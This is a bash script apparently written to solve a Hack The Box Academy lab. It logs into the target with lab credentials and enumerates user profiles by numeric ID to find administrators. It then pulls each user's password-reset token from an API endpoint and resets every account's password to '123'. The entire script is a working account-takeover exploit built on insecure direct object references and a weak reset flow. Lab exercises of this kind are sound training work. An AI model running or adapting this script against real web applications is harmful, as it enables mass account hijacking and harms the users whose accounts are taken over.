#!/bin/bash

# Check and install jq if needed
if ! command -v jq &> /dev/null; then
    echo "[*] Installing jq..."
    if [[ -f /etc/debian_version ]]; then
        sudo apt update && sudo apt install -y jq
    elif [[ -f /etc/redhat-release ]]; then
        sudo yum install -y jq
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        brew install jq
    else
        echo "[-] Please install jq manually and try again"
        exit 1
    fi
fi

# Target configuration
TARGET="http://94.237.55.43:50149"
LOGIN_URL="$TARGET/index.php"
CREDS="username=htb-student&password=Academy_student%21"

# Cookie management
COOKIE_FILE=$(mktemp)
trap 'rm -f "$COOKIE_FILE"' EXIT

echo "[*] Authenticating..."
curl -s -v -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Referer: $TARGET/" \
  -d "$CREDS" \
  -c "$COOKIE_FILE" -b "$COOKIE_FILE" > /dev/null 2>&1

if [ ! -s "$COOKIE_FILE" ] || ! grep -q "PHPSESSID" "$COOKIE_FILE"; then
  echo "[-] Authentication failed!"
  exit 1
fi
echo "[+] Authenticated successfully"

# Scan all users (1-100) with detailed output
declare -A USERS
echo -e "\n[*] Detailed user scan results:"
for id in {1..100}; do
    response=$(curl -s -b "$COOKIE_FILE" "$TARGET/profile.php?uid=$id")
    username=$(echo "$response" | grep -oP "username: \K.*")
    
    if [[ -n "$username" ]]; then
        USERS["$id"]="$username"
        echo -e "\n[+] UID $id: $username"
        echo "    Full response:"
        echo "$response" | sed 's/^/    /'
        
        # Check for various admin indicators
        if echo "$response" | grep -qi "admin"; then
            echo "    ^--- ADMIN DETECTED VIA 'admin' TEXT"
        fi
        if echo "$response" | grep -qi "role.*admin"; then
            echo "    ^--- ADMIN DETECTED VIA ROLE"
        fi
        if echo "$response" | grep -qi "privilege.*1"; then
            echo "    ^--- ADMIN DETECTED VIA PRIVILEGE"
        fi
    fi
done

# Show cookie contents
echo -e "\n[*] Current session cookies:"
cat "$COOKIE_FILE"

# Try token extraction for all discovered users
echo -e "\n[*] Attempting token extraction for all users:"
for id in "${!USERS[@]}"; do
    token=$(curl -s -b "$COOKIE_FILE" "$TARGET/api.php/token/$id" | jq -r '.token')
    if [[ -n "$token" && "$token" != "null" ]]; then
        echo "[+] Token for UID $id (${USERS[$id]}): $token"
        # Try password reset for each user with a token
        reset_response=$(curl -s -b "$COOKIE_FILE" "$TARGET/reset.php?uid=$id&token=$token&password=123")
        if echo "$reset_response" | grep -qi "success"; then
            echo "    PASSWORD RESET SUCCESSFUL! New password: 123"
        fi
    fi
done
